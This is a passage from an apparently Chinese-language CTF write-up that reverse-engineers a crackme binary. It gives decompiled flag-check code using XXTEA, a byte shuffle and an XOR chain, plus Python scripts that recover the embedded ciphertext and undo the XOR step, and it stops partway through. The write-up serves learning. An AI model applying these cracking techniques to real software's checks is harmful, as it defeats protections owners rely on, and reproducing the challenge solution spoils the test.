class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1400011A0(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // rbx</span><br><span class="line">  signed __int64 v3; // rax</span><br><span class="line">  __int128 *v4; // rax</span><br><span class="line">  __int64 v5; // r11</span><br><span class="line">  __int128 *v6; // r14</span><br><span class="line"> <span class="built_in"> int </span>v7; // edi</span><br><span class="line">  __int128 *v8; // rsi</span><br><span class="line">  char v9; // r10</span><br><span class="line"> <span class="built_in"> int </span>v10; // edx</span><br><span class="line">  __int64 v11; // r8</span><br><span class="line">  unsigned __int64 v12; // rcx</span><br><span class="line">  signed __int64 v13; // rcx</span><br><span class="line">  unsigned __int64 v14; // rax</span><br><span class="line">  unsigned __int64 i; // rax</span><br><span class="line">  _BYTE *v16; // rax</span><br><span class="line">  size_t size_24; // rsi</span><br><span class="line">  _BYTE *v18; // rbx</span><br><span class="line">  _BYTE *v19; // r9</span><br><span class="line">  signed<span class="built_in"> int </span>ii; // er11</span><br><span class="line">  char *v21; // r8</span><br><span class="line">  signed __int64 jj; // rcx</span><br><span class="line">  char s_i; // al</span><br><span class="line">  signed __int64 v24; // r9</span><br><span class="line">  signed __int64 v25; // rdx</span><br><span class="line">  _QWORD *v26; // rax</span><br><span class="line">  size_t Size; // [rsp+20h] [rbp-48h]</span><br><span class="line">  __int128 v29; // [rsp+28h] [rbp-40h]</span><br><span class="line"> <span class="built_in"> int </span>v30; // [rsp+38h] [rbp-30h]</span><br><span class="line"> <span class="built_in"> int </span>v31; // [rsp+3Ch] [rbp-2Ch]</span><br><span class="line"> <span class="built_in"> int </span>Code[4]; // [rsp+40h] [rbp-28h]</span><br><span class="line"> <span class="built_in"> int </span>v33; // [rsp+50h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  *(_OWORD *)Code = 0i64;</span><br><span class="line">  v33 = 0;</span><br><span class="line">  sub_1400018C0(std::cin, a2, Code);</span><br><span class="line">  v2 = -1i64;</span><br><span class="line">  v3 = -1i64;</span><br><span class="line">  do</span><br><span class="line">    ++v3;</span><br><span class="line">  while ( *((_BYTE *)Code + v3) );</span><br><span class="line"> <span class="built_in"> if </span>( v3 != 19 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140001620(std::cout, (__int64)<span class="string">"error\n"</span>);</span><br><span class="line">    _exit((unsigned __int64)Code);</span><br><span class="line">  &#125;                                             // 输入字符串    19位</span><br><span class="line">  v4 = (__int128 *)sub_140001E5C(5ui64);        // 000001621880CE40</span><br><span class="line">  v5 = *(_QWORD *)&amp;::Code;                      // qwertyuiopasdfghjklzxcvbnm1234567890</span><br><span class="line">  v6 = v4;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = v4;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *((_BYTE *)v8 + (char *)Code - (char *)v4);// 0</span><br><span class="line">    v10 = 0;                                    // 0</span><br><span class="line">    *(_BYTE *)v8 = v9;                          // 0</span><br><span class="line">    v11 = 0i64;</span><br><span class="line">    v12 = -1i64;</span><br><span class="line">    do</span><br><span class="line">      ++v12;</span><br><span class="line">    while ( *(_BYTE *)(v5 + v12) );</span><br><span class="line">   <span class="built_in"> if </span>( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="built_in"> if </span>( v9 == *(_BYTE *)(v5 + v11) )</span><br><span class="line">          break;</span><br><span class="line">        ++v10;</span><br><span class="line">        ++v11;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v10 &lt; v12 );</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = -1i64;</span><br><span class="line">    do</span><br><span class="line">      ++v13;</span><br><span class="line">    while ( *(_BYTE *)(v5 + v13) );</span><br><span class="line">   <span class="built_in"> if </span>( v10 == v13 )</span><br><span class="line">      _exit(v5);</span><br><span class="line">    v8 = (__int128 *)((char *)v8 + 1);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( (char *)v8 - (char *)v4 &lt; 4 );</span><br><span class="line">  *((_BYTE *)v4 + 4) = 0;</span><br><span class="line">  do</span><br><span class="line">    ++v2;</span><br><span class="line">  while ( *((_BYTE *)Code + v2) );</span><br><span class="line">  v14 = 0i64;</span><br><span class="line">  v29 = *v6;</span><br><span class="line">  while ( *((_BYTE *)&amp;v29 + v14) )</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( !*((_BYTE *)&amp;v29 + v14 + 1) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v14;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> if </span>( !*((_BYTE *)&amp;v29 + v14 + 2) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 += 2i64;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> if </span>( !*((_BYTE *)&amp;v29 + v14 + 3) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 += 3i64;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    v14 += 4i64;</span><br><span class="line">   <span class="built_in"> if </span>( v14 &gt;= 0x10 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i = v14 + 1; i &lt; 0x10; ++i )</span><br><span class="line">    *((_BYTE *)&amp;v29 + i) = 0;</span><br><span class="line">  v16 = sub_140001AB0((__int64)Code, v2, (unsigned __int8 *)&amp;v29, &amp;Size);// 前   4个 字节  作为 xxTea 密钥   </span><br><span class="line">  size_24 = Size;</span><br><span class="line">  v18 = v16;                                    // xxtea  加密后的 24字节 </span><br><span class="line">  v19 = sub_140001E5C(Size);</span><br><span class="line">  ii = 1;</span><br><span class="line">  *v19 = v18[2];</span><br><span class="line">  v21 = v19 + 1;</span><br><span class="line">  v19[1] = *v18;</span><br><span class="line">  v19[2] = v18[3];</span><br><span class="line">  v19[3] = v18[1];</span><br><span class="line">  v19[4] = v18[6];</span><br><span class="line">  v19[5] = v18[4];</span><br><span class="line">  v19[6] = v18[7];</span><br><span class="line">  v19[7] = v18[5];</span><br><span class="line">  v19[8] = v18[10];</span><br><span class="line">  v19[9] = v18[8];</span><br><span class="line">  v19[10] = v18[11];</span><br><span class="line">  v19[11] = v18[9];</span><br><span class="line">  v19[12] = v18[14];</span><br><span class="line">  v19[13] = v18[12];</span><br><span class="line">  v19[14] = v18[15];</span><br><span class="line">  v19[15] = v18[13];</span><br><span class="line">  v19[16] = v18[18];</span><br><span class="line">  v19[17] = v18[16];</span><br><span class="line">  v19[18] = v18[19];</span><br><span class="line">  v19[19] = v18[17];</span><br><span class="line">  v19[20] = v18[22];                            // 加密后  密文   重新排 了 序</span><br><span class="line">  v19[21] = v18[20];</span><br><span class="line">  v19[22] = v18[23];</span><br><span class="line">  for ( v19[23] = v18[21]; ii &lt; size_24; ++v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    jj = 0i64;</span><br><span class="line">   <span class="built_in"> if </span>( ii / 3 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      s_i = *v21;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        s_i ^= v19[jj++];</span><br><span class="line">        *v21 = s_i;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( jj &lt; ii / 3 );</span><br><span class="line">    &#125;</span><br><span class="line">    ++ii;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;v29 = 0xC0953A7C6B40BCCEi64;</span><br><span class="line">  v24 = v19 - (_BYTE *)&amp;v29;</span><br><span class="line">  *((_QWORD *)&amp;v29 + 1) = 0x3502F79120209BEFi64;</span><br><span class="line">  v25 = 0i64;</span><br><span class="line">  v30 = 0xC8021823;</span><br><span class="line">  v31 = 0xFA5656E7;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( *((_BYTE *)&amp;v29 + v25) != *((_BYTE *)&amp;v29 + v25 + v24) )</span><br><span class="line">      _exit(v7 * v7);</span><br><span class="line">    ++v7;</span><br><span class="line">    ++v25;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v25 &lt; 24 );</span><br><span class="line">  v26 = sub_140001620(std::cout, (__int64)<span class="string">"You win!"</span>);</span><br><span class="line">  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v26, sub_1400017F0);</span><br><span class="line"> <span class="built_in"> return </span>0i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其中sub-140001AB0-函数-是xxtea-算法"><a href="#其中sub-140001AB0-函数-是xxtea-算法" class="headerlink" title="其中sub_140001AB0  函数     是xxtea 算法"></a>其中sub_140001AB0  函数     是xxtea 算法</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall sub_140001AB0(__int64 a1, unsigned __int64 a2, unsigned __int8 *a3, unsigned __int64 *a4)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 *v4; // r13</span><br><span class="line">  unsigned __int8 *v5; // rbp</span><br><span class="line">  unsigned __int64 v6; // rbx</span><br><span class="line">  __int64 v7; // rsi</span><br><span class="line">  unsigned __int64 v8; // rdi</span><br><span class="line">  size_t v9; // rcx</span><br><span class="line">  _DWORD *v10; // rax</span><br><span class="line">  _DWORD *v11; // r15</span><br><span class="line">  signed __int64 v12; // r14</span><br><span class="line">  unsigned __int64 v13; // rdi</span><br><span class="line">  unsigned __int64 v14; // r9</span><br><span class="line"> <span class="built_in"> int </span>v15; // edx</span><br><span class="line">  _DWORD *v16; // r8</span><br><span class="line">  char v17; // cl</span><br><span class="line">  _DWORD *v18; // r12</span><br><span class="line"> <span class="built_in"> int </span>v19; // ecx</span><br><span class="line"> <span class="built_in"> int </span>v20; // eax</span><br><span class="line"> <span class="built_in"> int </span>v21; // ecx</span><br><span class="line"> <span class="built_in"> int </span>v22; // eax</span><br><span class="line"> <span class="built_in"> int </span>v23; // ecx</span><br><span class="line"> <span class="built_in"> int </span>v24; // eax</span><br><span class="line"> <span class="built_in"> int </span>v25; // ecx</span><br><span class="line"> <span class="built_in"> int </span>v26; // eax</span><br><span class="line">  unsigned<span class="built_in"> int </span>v27; // ebp</span><br><span class="line">  __int64 v28; // rcx</span><br><span class="line">  unsigned<span class="built_in"> int </span>v29; // er10</span><br><span class="line">  unsigned<span class="built_in"> int </span>v30; // eax</span><br><span class="line">  __int64 v31; // r9</span><br><span class="line">  unsigned<span class="built_in"> int </span>*v32; // rbx</span><br><span class="line">  __int64 v33; // r11</span><br><span class="line">  _DWORD *v34; // rax</span><br><span class="line">  __int64 v35; // rsi</span><br><span class="line">  __int64 v36; // r14</span><br><span class="line">  char v37; // r13</span><br><span class="line">  unsigned<span class="built_in"> int </span>v38; // er8</span><br><span class="line">  __int64 v39; // rcx</span><br><span class="line">  unsigned __int64 v40; // rbx</span><br><span class="line">  size_t v41; // rcx</span><br><span class="line">  _BYTE *v42; // rax</span><br><span class="line">  _BYTE *v43; // rsi</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  char v45; // [rsp+20h] [rbp-58h]</span><br><span class="line">  __int64 v46; // [rsp+28h] [rbp-50h]</span><br><span class="line">  signed __int64 v47; // [rsp+30h] [rbp-48h]</span><br><span class="line"> <span class="built_in"> int </span>v48; // [rsp+88h] [rbp+10h]</span><br><span class="line">  unsigned __int64 *v49; // [rsp+98h] [rbp+20h]</span><br><span class="line"></span><br><span class="line">  v49 = a4;</span><br><span class="line">  v4 = a4;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v7 = a1;</span><br><span class="line"> <span class="built_in"> if </span>( !a2 )</span><br><span class="line">   <span class="built_in"> return </span>0i64;</span><br><span class="line">  v8 = a2 &gt;&gt; 2;</span><br><span class="line"> <span class="built_in"> if </span>( a2 &amp; 3 )</span><br><span class="line">    v8 = (a2 &gt;&gt; 2) + 1;</span><br><span class="line">  v9 = v8 + 1;</span><br><span class="line"> <span class="built_in"> if </span>( v8 &gt;= 0xFFFFFFFFFFFFFFFFui64 )</span><br><span class="line">    v9 = -1i64;</span><br><span class="line">  v10 = calloc(v9, 4ui64);</span><br><span class="line">  v11 = v10;</span><br><span class="line"> <span class="built_in"> if </span>( !v10 )</span><br><span class="line">   <span class="built_in"> return </span>0i64;</span><br><span class="line">  v12 = v8 + 1;</span><br><span class="line">  v10[v8] = v6;</span><br><span class="line">  v13 = 0i64;</span><br><span class="line">  v47 = v12;</span><br><span class="line">  v14 = 0i64;</span><br><span class="line"> <span class="built_in"> if </span>( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = *(unsigned __int8 *)(v14 + v7);</span><br><span class="line">      v16 = &amp;v10[v14 &gt;&gt; 2];</span><br><span class="line">      v17 = v14++ &amp; 3;</span><br><span class="line">      *v16 |= v15 &lt;&lt; 8 * v17;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v14 &lt; v6 );</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = calloc(4ui64, 4ui64);</span><br><span class="line"> <span class="built_in"> if </span>( v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = v5[7] &lt;&lt; 8;</span><br><span class="line">    v20 = v5[6];</span><br><span class="line">    *v18 |= *v5 | ((v5[1] | (*((unsigned __int16 *)v5 + 1) &lt;&lt; 8)) &lt;&lt; 8);</span><br><span class="line">    v21 = v5[4] | ((v5[5] | ((v20 | v19) &lt;&lt; 8)) &lt;&lt; 8);</span><br><span class="line">    v22 = v5[10];</span><br><span class="line">    v18[1] |= v21;</span><br><span class="line">    v23 = v5[8] | ((v5[9] | ((v22 | (v5[11] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8);</span><br><span class="line">    v24 = v5[14];</span><br><span class="line">    v18[2] |= v23;</span><br><span class="line">    v25 = v5[13] | ((v24 | (v5[15] &lt;&lt; 8)) &lt;&lt; 8);</span><br><span class="line">    v26 = v5[12];</span><br><span class="line">    v27 = 0;</span><br><span class="line">    v18[3] |= v26 | (v25 &lt;&lt; 8);</span><br><span class="line">    v28 = (unsigned int)(v12 - 1);</span><br><span class="line">    v29 = v11[v28];</span><br><span class="line">    v30 = 0x34 / (unsigned int)v12 + 6;</span><br><span class="line">    v31 = (unsigned int)(v12 - 1);</span><br><span class="line">    v45 = v12 - 1;</span><br><span class="line">    v46 = (unsigned int)(v12 - 1);</span><br><span class="line">   <span class="built_in"> if </span>( (unsigned int)v28 &gt;= 1 &amp;&amp; 0x34 / (unsigned int)v12 != -6 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = v11 + 1;</span><br><span class="line">        v27 -= 1640531527;</span><br><span class="line">        v48 = v30 - 1;</span><br><span class="line">        v33 = 0i64;</span><br><span class="line">        v34 = v11;</span><br><span class="line">        v35 = (v27 &gt;&gt; 2) &amp; 3;</span><br><span class="line">        v36 = v31;</span><br><span class="line">        v37 = v28;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          v38 = *v32;</span><br><span class="line">          ++v32;</span><br><span class="line">          ++v34;</span><br><span class="line">          v39 = v35 ^ v33++ &amp; 3;</span><br><span class="line">          *(v34 - 1) += ((v27 ^ v38) + (v29 ^ v18[v39])) ^ ((16 * v29 ^ (v38 &gt;&gt; 3)) + ((v29 &gt;&gt; 5) ^ 4 * v38));</span><br><span class="line">          v29 = *(v34 - 1);</span><br><span class="line">          --v36;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v36 );</span><br><span class="line">        v31 = v46;</span><br><span class="line">        LOBYTE(v28) = v45;</span><br><span class="line">        v30 = v48;</span><br><span class="line">        v11[v31] += ((v27 ^ *v11) + (v29 ^ v18[v35 ^ v37 &amp; 3])) ^ ((4 * *v11 ^ (v29 &gt;&gt; 5)) + ((*v11 &gt;&gt; 3) ^ 16 * v29));</span><br><span class="line">        v29 = v11[v46];</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v48 );</span><br><span class="line">      v12 = v47;</span><br><span class="line">      v4 = v49;</span><br><span class="line">    &#125;</span><br><span class="line">    v40 = 4 * v12;</span><br><span class="line">    v41 = 4 * v12 + 1;</span><br><span class="line">   <span class="built_in"> if </span>( (unsigned __int64)(4 * v12) &gt;= 0xFFFFFFFFFFFFFFFFui64 )</span><br><span class="line">      v41 = -1i64;</span><br><span class="line">    v42 = malloc(v41);</span><br><span class="line">    v43 = v42;</span><br><span class="line">   <span class="built_in"> if </span>( v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v42[v13] = v11[v13 &gt;&gt; 2] &gt;&gt; 8 * (v13 &amp; 3);</span><br><span class="line">        ++v13;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v13 &lt; v40 );</span><br><span class="line">    &#125;</span><br><span class="line">    v42[v40] = 0;</span><br><span class="line">    *v4 = v40;</span><br><span class="line">    free(v11);</span><br><span class="line">    free(v18);</span><br><span class="line">    result = v43;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v11);</span><br><span class="line">    result = 0i64;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="程序大概流程"><a href="#程序大概流程" class="headerlink" title="程序大概流程"></a>程序大概流程</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="number">19</span>字节</span><br><span class="line">取前四个字节 作为  xxtea 加解密算法 的密钥</span><br><span class="line">以 输入的<span class="number">19</span>个字符串为明文 ，与前四个字节为密钥，通过xxtea 加密后得到 <span class="number">24</span>字节密文</span><br><span class="line">密文<span class="number">24</span>字节 做置换    一系列的复制操作</span><br><span class="line">经处理过的密文  再次  通过 一系列 亦或 处理</span><br><span class="line">然后将再次经过的密文  与内置的密文作比较</span><br><span class="line"></span><br><span class="line">我们的思路就是 反着来！</span><br></pre></td></tr></table></figure><h2 id="第一步：提取-内置密文-（），"><a href="#第一步：提取-内置密文-（），" class="headerlink" title="第一步：提取 内置密文  （），"></a>第一步：提取 内置密文  （），</h2><blockquote><p>即 经过 xxTea算法加密后再置换再亦或的24位 数据<br>（这里要注意下   要将反编译得到的是   内存形式存放的密文），<br>但我没想到一个好的提取方法，写了个 简单代码（不断复制粘贴就好），<br>其实  数据不多，完全可以 纯手打的！</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">ida2list=[]</span><br><span class="line">zui=<span class="string">''</span></span><br><span class="line">ida=<span class="string">"FA5656E7"</span></span><br><span class="line">print(ida)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">0</span>,len(ida),<span class="number">2</span>):</span><br><span class="line">    ida2list.append(ida[i:i+<span class="number">2</span>])</span><br><span class="line">ida2list.reverse()</span><br><span class="line">print(ida2list)</span><br><span class="line">for x <span class="keyword">in</span> range(len(ida2list)):</span><br><span class="line">zui+=ida2list[x]</span><br><span class="line">print(zui)</span><br><span class="line">#C0953A7C6B40BCCE-------------------》CEBC406B7C3A95C0</span><br><span class="line">#<span class="number">3502</span>F79120209BEF------------------》EF9B202091F70235</span><br><span class="line">##C8021823------------------》<span class="number">231802</span>C8</span><br><span class="line">##FA5656E7------------------》E75656FA</span><br><span class="line">#</span><br><span class="line">#CEBC406B7C3A95C0EF9B202091F70235231802C8E75656FA</span><br><span class="line">#</span><br><span class="line"># [<span class="string">'CE'</span>, <span class="string">'BC'</span>, <span class="string">'40'</span>, <span class="string">'6B'</span>, <span class="string">'7C'</span>, <span class="string">'3A'</span>, <span class="string">'95'</span>, <span class="string">'C0'</span>]</span><br><span class="line"># [<span class="string">'EF'</span>, <span class="string">'9B'</span>, <span class="string">'20'</span>, <span class="string">'20'</span>, <span class="string">'91'</span>, <span class="string">'F7'</span>, <span class="string">'02'</span>, <span class="string">'35'</span>]</span><br><span class="line"># [<span class="string">'23'</span>, <span class="string">'18'</span>, <span class="string">'02'</span>, <span class="string">'C8'</span>]</span><br><span class="line"># [<span class="string">'E7'</span>, <span class="string">'56'</span>, <span class="string">'56'</span>, <span class="string">'FA'</span>]</span><br></pre></td></tr></table></figure><h2 id="第二步：通过-亦或后的数据-逆推处-置换后的24-位-数据"><a href="#第二步：通过-亦或后的数据-逆推处-置换后的24-位-数据" class="headerlink" title="第二步：通过  亦或后的数据  逆推处   置换后的24 位 数据"></a>第二步：通过  亦或后的数据  逆推处   置换后的24 位 数据</h2><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flagg=[<span class="string">'CE'</span>, <span class="string">'BC'</span>, <span class="string">'40'</span>, <span class="string">'6B'</span>, <span class="string">'7C'</span>, <span class="string">'3A'</span>, <span class="string">'95'</span>, <span class="string">'C0'</span>,<span class="string">'EF'</span>, <span class="string">'9B'</span>, <span class="string">'20'</span>, <span class="string">'20'</span>, <span class="string">'91'</span>, <span class="string">'F7'</span>, <span class="string">'02'</span>, <span class="string">'35'</span>,<span class="string">'23'</span>, <span class="string">'18'</span>, <span class="string">'02'</span>, <span class="string">'C8'</span>,<span class="string">'E7'</span>, <span class="string">'56'</span>, <span class="string">'56'</span>, <span class="string">'FA'</span>]</span><br><span class="line"></span><br><span class="line">flagg = [<span class="number">0xCE</span>,<span class="number">0xBC</span>,<span class="number">0x40</span>,<span class="number">0x6B</span>,<span class="number">0x7C</span>,<span class="number">0x3A</span>,<span class="number">0x95</span>,<span class="number">0xC0</span>,<span class="number">0xEF</span>,<span class="number">0x9B</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x91</span>,<span class="number">0xF7</span>,<span class="number">0x02</span>,<span class="number">0x35</span>,<span class="number">0x23</span>,<span class="number">0x18</span>,<span class="number">0x02</span>,<span class="number">0xC8</span>,<span class="number">0xE7</span>,<span class="number">0x56</span>,<span class="number">0x56</span>,<span class="number">0xFA</span>]</span><br><span class="line">flagfan = [<span class="number">0</span>]*<span class="number">24</span></span><br><span class="line">for i in range(len(flagg)):</span><br><span class="line">    flagfan[i] = flagg[i]</span><br><span class="line">for i in range(<span class="number">1</span>,len(flagg)):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    if i/<span class="number">3</span> &gt; <span class="number">0</span>:</span><br><span class="line">        while(j&lt;(i/<span class="number">3</span>)):</span><br><span class="line">            flagfan[i] = flagfan[i] ^ flagg[j]    ##<span class="number">0</span>^?=?</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">print flagfan</span><br><span class="line">#[<span class="number">206</span>, <span class="number">188</span>, <span class="number">64</span>, <span class="number">165</span>, <span class="number">178</span>, <span class="number">244</span>, <span class="number">231</span>, <span class="number">178</span>, <span class="number">157</span>, <span class="number">169</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">200</span>, <span class="number">174</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">215</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">220</span>, <span class="number">112</span>]</span><br></pre></td></tr></table></figure><h2 id="第三步：通过-置换后的数据-逆推处-xxTEA加密后的的24-位-数据"><a href="#第三步：通过-置换后的数据-逆推处-xxTEA加密后的的24-位-数据" class="headerlink" title="第三步：通过  置换后的数据  逆推处   xxTEA加密后的的24 位 数据"></a>第三步：通过  置换后的数据  逆推处   xxTEA加密后的的24 位 数据</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 